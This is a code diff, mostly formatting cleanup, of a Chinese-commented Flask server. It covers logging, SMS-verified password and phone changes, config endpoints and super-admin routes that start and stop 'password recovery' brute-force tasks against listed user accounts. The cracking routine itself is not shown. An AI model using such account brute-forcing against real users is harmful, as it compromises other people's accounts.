         返回值：
             dict: {"success": True/False, "message": "..."}
         """
@@ -13198,27 +13261,27 @@ class BruteForceTaskManager:
             # 检查任务是否存在
             if account not in self.tasks:
                 return {"success": False, "message": f"账号 {account} 没有任务"}
-            
+
             # 检查任务是否正在运行
             if self.tasks[account].get("status") != "running":
                 return {"success": False, "message": f"账号 {account} 的任务不在运行中"}
-            
+
             # 设置停止标志
             self.tasks[account]["stop_flag"] = True
-        
+
         logging.info(f"[密码恢复] 已发送停止信号给账号 {account} 的任务")
-        
+
         return {"success": True, "message": f"已发送停止信号给账号 {account}"}
 
     def stop_all_tasks(self):
         """
         停止所有正在运行的密码恢复任务
-        
+
         返回值：
             dict: {"success": True, "stopped_count": 整数}
         """
         stopped_count = 0
-        
+
         with self.lock:
             # 遍历所有任务
             for account, task_info in self.tasks.items():
@@ -13226,15 +13289,15 @@ class BruteForceTaskManager:
                 if task_info.get("status") == "running":
                     task_info["stop_flag"] = True
                     stopped_count += 1
-        
+
         logging.info(f"[密码恢复] 已发送停止信号给 {stopped_count} 个任务")
-        
+
         return {"success": True, "stopped_count": stopped_count}
 
     def get_all_tasks_status(self):
         """
         获取所有任务的状态
-        
+
         返回值：
             list: 任务状态列表，每个元素是一个任务信息字典
         """
@@ -13246,7 +13309,7 @@ class BruteForceTaskManager:
                 task_copy = task_info.copy()
                 task_copy.pop("stop_flag", None)
                 tasks_list.append(task_copy)
-            
+
             return tasks_list
 
 
@@ -13377,21 +13440,21 @@ def get_ssl_certificate_info(cert_path):
 def _send_startup_notification_to_log_forwarder(host, port):
     """
     通过UDP向日志转发器发送Flask启动通知
-    
+
     工作流程：
     1. 等待Flask服务器真正就绪（通过HTTP健康检查）
     2. 发送UDP启动通知到日志转发器
     3. 等待日志转发器的UDP确认响应
     4. 如果未收到确认，每5秒重试一次
     5. 如果1分钟内未成功，记录错误并停止尝试
-    
+
     参数：
         host (str): Flask服务器地址
         port (int): Flask服务器端口
     """
     import socket
     import time
-    
+
     # UDP配置
     LOG_FORWARDER_UDP_PORT = 9999  # 日志转发器监听端口
     MAIN_UDP_PORT = 9998  # main.py监听确认响应的端口
@@ -13399,63 +13462,72 @@ def _send_startup_notification_to_log_forwarder(host, port):
     ACK_MESSAGE = "ACK_RECEIVED"  # 确认消息
     MAX_WAIT_TIME = 60  # 最大等待时间（秒）
     RETRY_INTERVAL = 5  # 重试间隔（秒）
-    
+
     try:
         # 第1步：等待Flask服务器就绪（通过HTTP健康检查）
         logging.info("[UDP通知] 等待Flask服务器完全就绪...")
         flask_ready = False
         health_check_start = time.time()
-        
+
         while time.time() - health_check_start < 30:  # 最多等待30秒
             try:
                 import requests
+
                 response = requests.get(f"http://{host}:{port}/", timeout=1)
-                if response.status_code in [200, 404, 302]:  # 任何响应都表示服务器已启动
+                if response.status_code in [
+                    200,
+                    404,
+                    302,
+                ]:  # 任何响应都表示服务器已启动
                     flask_ready = True
                     logging.info("[UDP通知] Flask服务器已就绪")
                     break
             except:
                 time.sleep(0.5)  # 等待0.5秒后重试
-        
+
         if not flask_ready:
             logging.warning("[UDP通知] Flask服务器健康检查超时，仍然尝试发送UDP通知")
-        
+
         # 第2步：创建UDP socket用于发送通知和接收确认
         udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        udp_socket.bind(('127.0.0.1', MAIN_UDP_PORT))  # 绑定本地端口接收确认
+        udp_socket.bind(("127.0.0.1", MAIN_UDP_PORT))  # 绑定本地端口接收确认
         udp_socket.settimeout(RETRY_INTERVAL)  # 设置接收超时为重试间隔
-        
+
         logging.info(f"[UDP通知] 已创建UDP socket，监听端口 {MAIN_UDP_PORT}")
-        
+
         # 第3步：循环发送启动通知并等待确认
         start_time = time.time()
         attempt_count = 0
         confirmed = False
-        
+
         while time.time() - start_time < MAX_WAIT_TIME:
             attempt_count += 1
-            
+
             try:
                 # 发送启动通知
                 udp_socket.sendto(
-                    STARTUP_MESSAGE.encode('utf-8'),
-                    ('127.0.0.1', LOG_FORWARDER_UDP_PORT)
+                    STARTUP_MESSAGE.encode("utf-8"),
+                    ("127.0.0.1", LOG_FORWARDER_UDP_PORT),
                 )
-                logging.info(f"[UDP通知] 第{attempt_count}次尝试：已发送启动通知到日志转发器（端口{LOG_FORWARDER_UDP_PORT}）")
-                
+                logging.info(
+                    f"[UDP通知] 第{attempt_count}次尝试：已发送启动通知到日志转发器（端口{LOG_FORWARDER_UDP_PORT}）"
+                )
+
                 # 等待确认响应
                 try:
                     data, addr = udp_socket.recvfrom(1024)
-                    message = data.decode('utf-8')
-                    
+                    message = data.decode("utf-8")
+
                     if message == ACK_MESSAGE:
-                        logging.info(f"[UDP通知] ✓ 收到日志转发器的确认响应（来自 {addr}）")
+                        logging.info(
+                            f"[UDP通知] ✓ 收到日志转发器的确认响应（来自 {addr}）"
+                        )
                         logging.info("[UDP通知] 日志转发握手成功完成")
                         confirmed = True
                         break
                     else:
                         logging.warning(f"[UDP通知] 收到未知消息: {message}")
-                
+
                 except socket.timeout:
                     elapsed = int(time.time() - start_time)
                     logging.warning(
@@ -13463,11 +13535,11 @@ def _send_startup_notification_to_log_forwarder(host, port):
                         f"将在{RETRY_INTERVAL}秒后重试..."
                     )
                     # 超时后会在下一次循环重试
-            
+
             except Exception as e:
                 logging.error(f"[UDP通知] 发送通知时出错: {e}")
                 time.sleep(RETRY_INTERVAL)
-        
+
         # 第4步：检查是否成功
         if not confirmed:
             logging.error(
@@ -13475,11 +13547,11 @@ def _send_startup_notification_to_log_forwarder(host, port):
             )
             logging.error("[UDP通知] 日志转发系统可能未正常启动")
             logging.error("[UDP通知] 注意：这可能导致nginx日志未能转发到Python日志系统")
-        
+
         # 第5步：关闭UDP socket
         udp_socket.close()
         logging.info("[UDP通知] UDP通知线程结束")
-        
+
     except Exception as e:
         logging.error(f"[UDP通知] UDP通知线程发生异常: {e}", exc_info=True)
 
@@ -13517,7 +13589,7 @@ def start_web_server(args_param):
     try:
         background_task_manager = BackgroundTaskManager()
         logging.info("后台任务管理器初始化成功")
-        
+
         # 初始化密码恢复任务管理器
         global brute_force_manager
         brute_force_manager = BruteForceTaskManager(LOGIN_LOGS_DIR)
@@ -16252,11 +16324,11 @@ def start_web_server(args_param):
     def auth_admin_reset_password():
         """
         重置用户密码（管理员）或修改自己的密码。
-        
+
         支持两种身份验证方式：
         1. 原密码验证（old_password参数）
         2. 短信验证码验证（sms_code参数）
-        
+
         修改自己密码时，至少需要提供其中一种验证方式。
         管理员重置他人密码时，需要拥有reset_user_password权限。
         """
@@ -16288,7 +16360,7 @@ def start_web_server(args_param):
         # 验证必填参数：目标用户名和新密码
         if not target_username or not new_password:
             return jsonify({"success": False, "message": "参数缺失"})
-        
+
         # 判断是否是修改自己的密码
         is_self_change = target_username == auth_username
 
@@ -16298,8 +16370,10 @@ def start_web_server(args_param):
             # 至少需要提供其中一种验证方式
             # 注意：如果同时提供了两种验证方式，优先使用短信验证码
             if not old_password and not sms_code:
-                return jsonify({"success": False, "message": "请提供当前密码或短信验证码"})
-            
+                return jsonify(
+                    {"success": False, "message": "请提供当前密码或短信验证码"}
+                )
+
             # 获取用户信息文件路径
             user_file = auth_system.get_user_file_path(auth_username)
             # 检查用户文件是否存在
@@ -16318,40 +16392,56 @@ def start_web_server(args_param):
                 # 读取用户信息失败，记录错误日志
                 logging.error(f"读取用户 {auth_username} 信息失败: {e}")
                 return jsonify({"success": False, "message": "无法验证身份"}), 500
-            
+
             # ========== 开始身份验证 ==========
             # 用于记录是否使用了短信验证码，以便在密码重置成功后删除验证码
             sms_verified_phone = None
-            
+
             if sms_code:
                 # ===== 方式一：使用短信验证码验证（优先级更高） =====
                 # 当同时提供了短信验证码和原密码时，优先使用短信验证码
                 # 检查用户是否已绑定手机号
                 if not user_phone:
-                    return jsonify({"success": False, "message": "您未绑定手机号，无法使用短信验证"}), 400
-                
+                    return (
+                        jsonify(
+                            {
+                                "success": False,
+                                "message": "您未绑定手机号，无法使用短信验证",
+                            }
+                        ),
+                        400,
+                    )
+
                 # 声明使用全局的短信验证码存储字典
                 global sms_verification_codes
                 # 从存储中获取该手机号对应的验证码信息
                 stored_code_info = sms_verification_codes.get(user_phone)
-                
+
                 # 检查是否存在该手机号的验证码
                 if not stored_code_info:
-                    return jsonify({"success": False, "message": "请先获取短信验证码"}), 400
-                
+                    return (
+                        jsonify({"success": False, "message": "请先获取短信验证码"}),
+                        400,
+                    )
+
                 # 解构验证码信息：验证码内容和过期时间
                 stored_code, expires_at = stored_code_info
-                
+
                 # 检查验证码是否已过期
                 if time.time() > expires_at:
                     # 验证码已过期，删除已过期的验证码
                     del sms_verification_codes[user_phone]
-                    return jsonify({"success": False, "message": "验证码已过期，请重新获取"}), 400
-                
+                    return (
+                        jsonify(
+                            {"success": False, "message": "验证码已过期，请重新获取"}
+                        ),
+                        400,
+                    )
+
                 # 验证输入的验证码是否正确
                 if stored_code != sms_code:
                     return jsonify({"success": False, "message": "短信验证码错误"}), 400
-                
+
                 # 记录短信验证成功，但暂不删除验证码
                 # 验证码将在密码重置成功后删除，确保操作原子性
                 sms_verified_phone = user_phone
@@ -16370,17 +16460,17 @@ def start_web_server(args_param):
                 return jsonify({"success": False, "message": "权限不足"}), 403
             # 管理员重置他人密码不使用短信验证
             sms_verified_phone = None
-        
+
         # 调用auth_system的方法重置密码
         result = auth_system.reset_user_password(target_username, new_password)
-        
+
         # 密码重置成功后，删除已使用的短信验证码（如果使用了短信验证）
         # 放在此处确保只有在密码重置成功后才删除验证码
         # 如果重置失败，验证码仍然有效，用户可以重试
         if sms_verified_phone and result.get("success"):
             if sms_verified_phone in sms_verification_codes:
                 del sms_verification_codes[sms_verified_phone]
-        
+
         # 返回操作结果
         return jsonify(result)
 
@@ -16686,21 +16776,28 @@ def start_web_server(args_param):
             current_username = g.user
             # 使用 auth_system 获取详细信息
             user_details = auth_system.get_user_details(current_username)
-            
+
             if user_details:
-                return jsonify({
-                    "success": True,
-                    "username": user_details.get("auth_username"),
-                    "phone": user_details.get("phone"),
-                    "nickname": user_details.get("nickname"),
-                    "avatar_url": user_details.get("avatar_url"),
-                    "email": user_details.get("email", ""), # 部分前端逻辑可能需要email
-                    "data": user_details # 包含完整的用户数据
-                })
+                return jsonify(
+                    {
+                        "success": True,
+                        "username": user_details.get("auth_username"),
+                        "phone": user_details.get("phone"),
+                        "nickname": user_details.get("nickname"),
+                        "avatar_url": user_details.get("avatar_url"),
+                        "email": user_details.get(
+                            "email", ""
+                        ),  # 部分前端逻辑可能需要email
+                        "data": user_details,  # 包含完整的用户数据
+                    }
+                )
             return jsonify({"success": False, "message": "用户数据不存在"}), 404
         except Exception as e:
             logging.error(f"[API] 获取用户资料失败: {e}", exc_info=True)
-            return jsonify({"success": False, "message": f"获取资料失败: {str(e)}"}), 500
+            return (
+                jsonify({"success": False, "message": f"获取资料失败: {str(e)}"}),
+                500,
+            )
 
     @app.route("/auth/user/details", methods=["GET"])
     def auth_user_details():
@@ -18107,19 +18204,21 @@ def start_web_server(args_param):
         """接收前端日志并保存到后端日志文件（支持批量）"""
         try:
             req_data = request.get_json() or {}
-            
+
             # 获取公共信息
             session_id = request.headers.get("X-Session-ID", "UnknownSession")
             ip_address = request.headers.get("X-Forwarded-For", request.remote_addr)
             username = "Guest/Unknown"
-            
+
             # 查找用户信息（只查一次锁）
             with web_sessions_lock:
                 if session_id in web_sessions:
                     api_instance = web_sessions[session_id]
                     username_attr = getattr(api_instance, "auth_username", None)
                     if not username_attr and hasattr(api_instance, "user_data"):
-                        username_attr = getattr(api_instance.user_data, "username", None)
+                        username_attr = getattr(
+                            api_instance.user_data, "username", None
+                        )
 
                     if username_attr:
                         username = username_attr
@@ -18137,7 +18236,7 @@ def start_web_server(args_param):
                     return
 
                 log_message = f"[前端日志][IP:{ip_address}][前端时间:{timestamp}][用户:{username}][Session Id:{session_id}][{source}] {message}"
-                
+
                 if level == "DEBUG":
                     logging.debug(log_message)
                 elif level == "INFO":
@@ -18159,7 +18258,7 @@ def start_web_server(args_param):
                 process_single_log(req_data)
 
             return jsonify({"success": True})
-            
+
         except Exception as e:
             session_id_err = request.headers.get("X-Session-ID", "UnknownSession")
             ip_address_err = request.headers.get("X-Forwarded-For", request.remote_addr)
@@ -18173,7 +18272,7 @@ def start_web_server(args_param):
     def log_nginx():
         """
         接收nginx访问日志并记录到Python日志系统
-        
+
         接受的数据格式：
         {
             "remote_addr": "客户端IP",
@@ -18193,7 +18292,7 @@ def start_web_server(args_param):
         """
         try:
             req_data = request.get_json() or {}
-            
+
             # 定义单条nginx日志处理函数
             def process_nginx_log(log_entry):
                 # 提取nginx日志字段
@@ -18206,14 +18305,14 @@ def start_web_server(args_param):
                 referer = log_entry.get("http_referer", "-")
                 user_agent = log_entry.get("http_user_agent", "-")
                 forwarded_for = log_entry.get("http_x_forwarded_for", "-")
-                
+
                 # 格式化日志消息（类似nginx access.log格式）
                 log_message = (
                     f"[Nginx访问日志] {remote_addr} - {remote_user} [{time_local}] "
                     f'"{request_line}" {status} {body_bytes} '
                     f'"{referer}" "{user_agent}" "{forwarded_for}"'
                 )
-                
+
                 # 根据HTTP状态码决定日志级别
                 try:
                     status_code = int(status)
@@ -18229,7 +18328,7 @@ def start_web_server(args_param):
                 except (ValueError, TypeError):
                     # 状态码无效时使用INFO级别
                     logging.info(log_message)
-            
+
             # 判断是批量模式还是单条模式
             if "batch" in req_data and isinstance(req_data["batch"], list):
                 # 批量处理
@@ -18239,9 +18338,9 @@ def start_web_server(args_param):
             else:
                 # 单条处理
                 process_nginx_log(req_data)
-            
+
             return jsonify({"success": True})
-            
+
         except Exception as e:
             logging.error(
                 f"[Nginx日志处理错误] 处理失败: {e}",
@@ -18257,10 +18356,10 @@ def start_web_server(args_param):
     def get_beian_config():
         """
         获取备案信息配置（公开接口，无需登录）
-        
+
         这是一个公开的API端点，主要用于在登录页面等前端界面显示网站备案信息。
         不需要用户登录即可访问。
-        
+
         返回格式：
         {
             "success": true,
@@ -18271,7 +18370,7 @@ def start_web_server(args_param):
                 "show_police": true                       # 是否显示公安备案号
             }
         }
-        
+
         错误处理：
         - 如果配置文件不存在，返回空值和 false 标志（不显示任何备案信息）
         - 如果读取配置发生异常，同样返回空值和 false 标志，确保前端不会因为后端错误而崩溃
@@ -18279,70 +18378,72 @@ def start_web_server(args_param):
         try:
             # 创建一个 ConfigParser 对象，用于读取 INI 格式的配置文件
             config = configparser.ConfigParser()
-            
+
             # 定义配置文件的路径（config.ini 位于项目根目录）
             config_file = "config.ini"
-            
+
             # 检查配置文件是否存在于文件系统中
             # 这是一个预防性检查，避免在文件不存在时尝试读取导致错误
             if os.path.exists(config_file):
                 # 读取配置文件，指定 UTF-8 编码以支持中文字符
                 # 这样可以正确处理备案号中的中文字符（如"京"、"备"等）
                 config.read(config_file, encoding="utf-8")
-            
+
             # 从配置文件的 [Beian] 部分读取备案信息
             # 使用 fallback 参数提供默认值，确保即使配置项不存在也不会抛出异常
-            
+
             # 读取 ICP 备案号（例如："京ICP备12345678号"）
             # 如果配置文件中不存在该项，则默认返回空字符串
             icp_number = config.get("Beian", "icp_number", fallback="")
-            
+
             # 读取是否显示 ICP 备案号的布尔值
             # getboolean() 方法会将 "true"/"false"、"yes"/"no"、"1"/"0" 等字符串转换为布尔值
             # 如果配置项不存在，默认为 False（不显示）
             show_icp = config.getboolean("Beian", "show_icp", fallback=False)
-            
+
             # 读取公安备案号（例如："京公网安备 11010802012345号"）
             # 如果配置文件中不存在该项，则默认返回空字符串
             police_number = config.get("Beian", "police_number", fallback="")
-            
+
             # 读取是否显示公安备案号的布尔值
             # 如果配置项不存在，默认为 False（不显示）
             show_police = config.getboolean("Beian", "show_police", fallback=False)
-            
+
             # 将读取到的配置信息组装成一个字典对象
             # 这个字典将作为 API 响应的数据部分返回给前端
             beian_config = {
-                "icp_number": icp_number,          # ICP备案号字符串
-                "show_icp": show_icp,              # 是否显示ICP备案号（布尔值）
-                "police_number": police_number,    # 公安备案号字符串
-                "show_police": show_police,        # 是否显示公安备案号（布尔值）
+                "icp_number": icp_number,  # ICP备案号字符串
+                "show_icp": show_icp,  # 是否显示ICP备案号（布尔值）
+                "police_number": police_number,  # 公安备案号字符串
+                "show_police": show_police,  # 是否显示公安备案号（布尔值）
             }
-            
+
             # 返回 JSON 格式的成功响应
             # jsonify() 是 Flask 提供的函数，用于将 Python 字典转换为 JSON 响应
             # 设置 success=True 表示操作成功，data 包含实际的备案配置信息
             return jsonify({"success": True, "data": beian_config})
-            
+
         except Exception as e:
             # 捕获所有可能发生的异常（例如：文件读取错误、配置解析错误等）
             # 使用 app.logger.error() 记录错误信息到应用日志中，便于后续排查问题
             # str(e) 将异常对象转换为字符串，以便记录具体的错误信息
             app.logger.error(f"获取备案配置失败: {str(e)}")
-            
+
             # 即使发生错误，也返回一个"成功"的响应（success=True）
             # 这是一个设计决策：我们不希望前端因为备案信息读取失败而显示错误
             # 相反，我们返回空的备案信息（所有字段为空或 false），前端将不显示任何备案信息
             # 这样可以确保即使后端配置出现问题，前端页面仍然可以正常工作
-            return jsonify({
-                "success": True,    # 仍然返回 success=True，避免前端报错
-                "data": {
-                    "icp_number": "",      # 返回空字符串，表示没有ICP备案号
-                    "show_icp": False,     # 不显示ICP备案号
-                    "police_number": "",   # 返回空字符串，表示没有公安备案号
-                    "show_police": False,  # 不显示公安备案号
+            return jsonify(
+                {
+                    "success": True,  # 仍然返回 success=True，避免前端报错
+                    "data": {
+                        "icp_number": "",  # 返回空字符串，表示没有ICP备案号
+                        "show_icp": False,  # 不显示ICP备案号
+                        "police_number": "",  # 返回空字符串，表示没有公安备案号
+                        "show_police": False,  # 不显示公安备案号
+                    },
                 }
-            })
+            )
 
     @app.route("/api/auth/check_phone", methods=["POST"])
     def auth_check_phone():
@@ -18373,9 +18474,9 @@ def start_web_server(args_param):
     def user_update_phone():
         """
         用户修改自己的手机号。
-        
+
         需要同时验证密码和短信验证码才能修改手机号。
-        
+
         参数:
         - password: 当前账户密码（用于身份验证）
         - new_phone: 新的手机号码
@@ -18396,7 +18497,7 @@ def start_web_server(args_param):
                 return jsonify(
                     {"success": False, "message": "系统未开启手机号修改功能"}
                 )
-            
+
             # 解析请求体JSON数据
             data = request.get_json() or {}
             # 获取新手机号并去除首尾空格
@@ -18414,32 +18515,32 @@ def start_web_server(args_param):
             # ========== 验证短信验证码不能为空 ==========
             if not sms_code:
                 return jsonify({"success": False, "message": "请输入短信验证码"})
-            
+
             # ========== 新增：验证密码不能为空 ==========
             if not password:
                 return jsonify({"success": False, "message": "请输入当前密码进行验证"})
-            
+
             # 获取当前登录用户的用户名
             current_username = g.user
-            
+
             # ========== 新增：获取用户信息并验证密码 ==========
             # 获取用户信息文件路径
             user_file_path = auth_system.get_user_file_path(current_username)
             # 检查用户文件是否存在
             if not os.path.exists(user_file_path):
                 return jsonify({"success": False, "message": "当前用户文件不存在"}), 404
-            
+
             # 读取用户信息以验证密码
             with open(user_file_path, "r", encoding="utf-8") as f:
                 user_data = json.load(f)
-            
+
             # 获取存储的密码哈希值
             stored_password = user_data.get("password", "")
             # 验证输入的密码是否正确
             if not auth_system._verify_password(password, stored_password):
                 # 密码验证失败
                 return jsonify({"success": False, "message": "密码错误，请重新输入"})
-            
+
             # ========== 验证短信验证码 ==========
             # 声明使用全局的短信验证码存储字典
             global sms_verification_codes
@@ -18464,16 +18565,16 @@ def start_web_server(args_param):
             # 验证输入的验证码是否正确
             if stored_code != sms_code:
                 return jsonify({"success": False, "message": "验证码错误"})
-            
+
             # ========== 更新手机号 ==========
             # 注意：将验证码删除操作移到所有数据库操作成功之后
             # 这样可以确保在操作失败时，用户不需要重新获取验证码
-            
+
             # 解绑其他用户绑定的相同手机号（确保手机号唯一性）
             auth_system.unbind_phone_from_user(
                 new_phone, except_username=current_username
             )
-            
+
             # 使用锁保护文件读写操作，防止并发冲突
             with auth_system.lock:
                 # 重新读取用户信息文件（防止锁等待期间数据被修改）
@@ -18486,12 +18587,12 @@ def start_web_server(args_param):
                 # 将更新后的用户信息写回文件
                 with open(user_file_path, "w", encoding="utf-8") as f:
                     json.dump(user_data, f, indent=2, ensure_ascii=False)
-            
+
             # 手机号更新成功后，删除已使用的验证码（一次性使用）
             # 放在此处确保只有在所有操作成功后才删除验证码
             # 如果前面的操作失败，验证码仍然有效，用户可以重试
             del sms_verification_codes[new_phone]
-            
+
             # 获取客户端IP地址，优先使用X-Forwarded-For头（代理场景）
             ip_address = request.headers.get("X-Forwarded-For", request.remote_addr)
             # 记录审计日志
@@ -19335,12 +19436,12 @@ def start_web_server(args_param):
     def get_cdn_config():
         """
         获取CDN缓存配置
-        
+
         功能说明：
         - 从config.ini文件读取CDN配置
         - 返回CDN启用状态和缓存时间
         - 需要管理员权限（manage_system）
-        
+
         返回格式：
         {
             "success": true,
@@ -19356,68 +19457,66 @@ def start_web_server(args_param):
             if not auth_system.check_permission(g.user, "manage_system"):
                 # 权限不足，返回403 Forbidden状态码
                 return jsonify({"success": False, "message": "权限不足"}), 403
-            
+
             # 创建ConfigParser对象读取配置文件
             config = configparser.ConfigParser()
-            
+
             # 检查配置文件是否存在
             if not os.path.exists(CONFIG_FILE):
                 # 配置文件不存在，返回默认配置
-                logging.warning(f"[CDN配置] 配置文件 {CONFIG_FILE} 不存在，使用默认配置")
-                return jsonify({
-                    "success": True,
-                    "config": {
-                        "cdn_enabled": False,
-                        "cache_time": 3600
+                logging.warning(
+                    f"[CDN配置] 配置文件 {CONFIG_FILE} 不存在，使用默认配置"
+                )
+                return jsonify(
+                    {
+                        "success": True,
+                        "config": {"cdn_enabled": False, "cache_time": 3600},
                     }
-                })
-            
+                )
+
             # 读取配置文件
             config.read(CONFIG_FILE, encoding="utf-8")
-            
+
             # 读取CDN配置，如果不存在则使用默认值
             cdn_enabled = config.getboolean("CDN", "cdn_enabled", fallback=False)
             cache_time = config.getint("CDN", "cache_time", fallback=3600)
-            
+
             # 组装配置数据
-            cdn_config = {
-                "cdn_enabled": cdn_enabled,
-                "cache_time": cache_time
-            }
-            
+            cdn_config = {"cdn_enabled": cdn_enabled, "cache_time": cache_time}
+
             # 记录配置加载日志，包括用户名
             logging.info(f"[CDN配置] {g.user} 查询CDN配置: {cdn_config}")
-            
+
             # 返回成功响应，包含配置数据
-            return jsonify({
-                "success": True,
-                "config": cdn_config
-            })
+            return jsonify({"success": True, "config": cdn_config})
 
         except Exception as e:
             # 捕获所有异常，记录错误日志
             logging.error(f"[CDN配置] 获取配置失败: {e}", exc_info=True)
             # 返回500 Internal Server Error状态码
-            return jsonify({"success": False, "message": f"获取配置失败: {str(e)}"}), 500
+            return (
+                jsonify({"success": False, "message": f"获取配置失败: {str(e)}"}),
+                500,
+            )
 
     @app.route("/api/admin/cdn/config", methods=["POST"])
     @login_required
     def update_cdn_config():
         """
         更新CDN缓存配置
-        
+
         功能说明：
         - 接收前端提交的CDN配置数据
         - 验证数据的有效性
         - 保存配置到config.ini文件（使用_write_config_with_comments保留注释）
         - 需要管理员权限（manage_system）
-        
+
         请求格式：
         {
             "cdn_enabled": true,
             "cache_time": 3600
         }
-        
+
         返回格式：
         {
             "success": true,
@@ -19432,18 +19531,18 @@ def start_web_server(args_param):
             # 检查用户权限
             if not auth_system.check_permission(g.user, "manage_system"):
                 return jsonify({"success": False, "message": "权限不足"}), 403
-            
+
             # 获取请求体中的JSON数据
             data = request.get_json()
-            
+
             # 验证请求数据是否存在
             if not data:
                 # 请求数据为空，返回400 Bad Request状态码
                 return jsonify({"success": False, "message": "请求数据为空"}), 400
-            
+
             # 创建ConfigParser对象读取现有配置
             config = configparser.ConfigParser()
-            
+
             # 检查配置文件是否存在
             if os.path.exists(CONFIG_FILE):
                 # 配置文件存在，读取现有配置
@@ -19452,67 +19551,77 @@ def start_web_server(args_param):
                 # 配置文件不存在，使用默认配置
                 logging.warning("[CDN配置] config.ini 文件不存在，将创建新的配置文件")
                 config = _get_default_config()
-            
+
             # 确保[CDN]节存在
             if not config.has_section("CDN"):
                 config.add_section("CDN")
-            
+
             # 当前配置值（用于返回）
-            current_cdn_enabled = config.getboolean("CDN", "cdn_enabled", fallback=False)
+            current_cdn_enabled = config.getboolean(
+                "CDN", "cdn_enabled", fallback=False
+            )
             current_cache_time = config.getint("CDN", "cache_time", fallback=3600)
-            
+
             # 更新cdn_enabled配置（如果请求中提供了该字段）
             if "cdn_enabled" in data:
                 # 将值转换为布尔类型，确保数据类型正确
                 cdn_enabled = bool(data["cdn_enabled"])
                 config.set("CDN", "cdn_enabled", str(cdn_enabled).lower())
                 current_cdn_enabled = cdn_enabled
-            
+
             # 更新cache_time配置（如果请求中提供了该字段）
             if "cache_time" in data:
                 # 将值转换为整数类型
                 cache_time = int(data["cache_time"])
-                
+
                 # 验证缓存时间是否为非负数
                 if cache_time < 0:
                     # 缓存时间不能为负数，返回错误
-                    return jsonify({
-                        "success": False,
-                        "message": "缓存时间必须大于等于0"
-                    }), 400
-                
+                    return (
+                        jsonify({"success": False, "message": "缓存时间必须大于等于0"}),
+                        400,
+                    )
+
                 # 验证通过，更新配置
                 config.set("CDN", "cache_time", str(cache_time))
                 current_cache_time = cache_time
-            
+
             # 使用_write_config_with_comments函数保存配置以保留注释
             _write_config_with_comments(config, CONFIG_FILE)
-            
+
             # 组装返回的配置数据
             saved_config = {
                 "cdn_enabled": current_cdn_enabled,
-                "cache_time": current_cache_time
+                "cache_time": current_cache_time,
             }
-            
+
             # 记录日志
             logging.info(f"[CDN配置] {g.user} 更新CDN配置: {saved_config}")
-            
+
             # 返回成功响应
-            return jsonify({
-                "success": True,
-                "message": "配置已保存，立即生效",
-                "config": saved_config
-            })
+            return jsonify(
+                {
+                    "success": True,
+                    "message": "配置已保存，立即生效",
+                    "config": saved_config,
+                }
+            )
 
         except ValueError as e:
             # 捕获值转换错误（例如字符串转整数失败）
             logging.error(f"[CDN配置] 配置数据类型错误: {e}")
-            return jsonify({"success": False, "message": f"配置数据格式错误: {str(e)}"}), 400
-        
+            return (
+                jsonify({"success": False, "message": f"配置数据格式错误: {str(e)}"}),
+                400,
+            )
+
         except Exception as e:
             # 捕获其他所有异常
             logging.error(f"[CDN配置] 更新配置失败: {e}", exc_info=True)
-            return jsonify({"success": False, "message": f"更新配置失败: {str(e)}"}), 500
+            return (
+                jsonify({"success": False, "message": f"更新配置失败: {str(e)}"}),
+                500,
+            )
 
     # ============================================================================
     # 密码恢复（暴力破解）API（仅超级管理员）
@@ -19522,7 +19631,7 @@ def start_web_server(args_param):
     def check_super_admin_permission():
         """
         检查当前用户是否为超级管理员
-        
+
         返回:
             tuple: (is_super_admin: bool, error_response: tuple|None)
                    如果不是超级管理员，返回(False, error_response)
@@ -19532,11 +19641,18 @@ def start_web_server(args_param):
             config = configparser.ConfigParser()
             config.read(CONFIG_FILE, encoding="utf-8")
             super_admin = config.get("Admin", "super_admin", fallback="admin")
-            
+
             if g.user != super_admin:
-                logging.warning(f"[权限检查] 非超级管理员 {g.user} 尝试访问超级管理员功能")
-                return False, (jsonify({"success": False, "message": "权限不足：需要超级管理员权限"}), 403)
-            
+                logging.warning(
+                    f"[权限检查] 非超级管理员 {g.user} 尝试访问超级管理员功能"
+                )
+                return False, (
+                    jsonify(
+                        {"success": False, "message": "权限不足：需要超级管理员权限"}
+                    ),
+                    403,
+                )
+
             return True, None
         except Exception as e:
             logging.error(f"[权限检查] 检查超级管理员权限失败: {e}", exc_info=True)
@@ -19554,39 +19670,52 @@ def start_web_server(args_param):
             is_super_admin, error_response = check_super_admin_permission()
             if not is_super_admin:
                 return error_response
-            
+
             # 获取请求数据
             data = request.get_json()
             if not data or "accounts" not in data:
                 return jsonify({"success": False, "message": "缺少accounts参数"}), 400
-            
+
             accounts = data["accounts"]
             if not isinstance(accounts, list) or len(accounts) == 0:
-                return jsonify({"success": False, "message": "accounts必须是非空列表"}), 400
-            
+                return (
+                    jsonify({"success": False, "message": "accounts必须是非空列表"}),
+                    400,
+                )
+
             # 检查brute_force_manager是否可用
             global brute_force_manager
             if not brute_force_manager:
-                return jsonify({"success": False, "message": "密码恢复管理器未初始化"}), 500
-            
+                return (
+                    jsonify({"success": False, "message": "密码恢复管理器未初始化"}),
+                    500,
+                )
+
             # 启动每个账号的任务
             results = []
             for account in accounts:
                 result = brute_force_manager.start_task(account)
                 results.append({"account": account, "result": result})
-            
+
             # 记录审计日志
-            logging.warning(f"[密码恢复] 超级管理员 {g.user} 启动了 {len(accounts)} 个账号的密码恢复任务：{accounts}")
-            
-            return jsonify({
-                "success": True,
-                "message": f"已启动 {len(accounts)} 个任务",
-                "results": results
-            })
-        
+            logging.warning(
+                f"[密码恢复] 超级管理员 {g.user} 启动了 {len(accounts)} 个账号的密码恢复任务：{accounts}"
+            )
+
+            return jsonify(
+                {
+                    "success": True,
+                    "message": f"已启动 {len(accounts)} 个任务",
+                    "results": results,
+                }
+            )
+
         except Exception as e:
             logging.error(f"[密码恢复] 启动任务失败: {e}", exc_info=True)
-            return jsonify({"success": False, "message": f"启动任务失败: {str(e)}"}), 500
+            return (
+                jsonify({"success": False, "message": f"启动任务失败: {str(e)}"}),
+                500,
+            )
 
     @app.route("/api/admin/bruteforce/stop", methods=["POST"])
     @login_required
@@ -19600,44 +19729,62 @@ def start_web_server(args_param):
             is_super_admin, error_response = check_super_admin_permission()
             if not is_super_admin:
                 return error_response
-            
+
             # 获取请求数据
             data = request.get_json()
             if not data:
                 return jsonify({"success": False, "message": "缺少请求数据"}), 400
-            
+
             global brute_force_manager
             if not brute_force_manager:
-                return jsonify({"success": False, "message": "密码恢复管理器未初始化"}), 500
-            
+                return (
+                    jsonify({"success": False, "message": "密码恢复管理器未初始化"}),
+                    500,
+                )
+
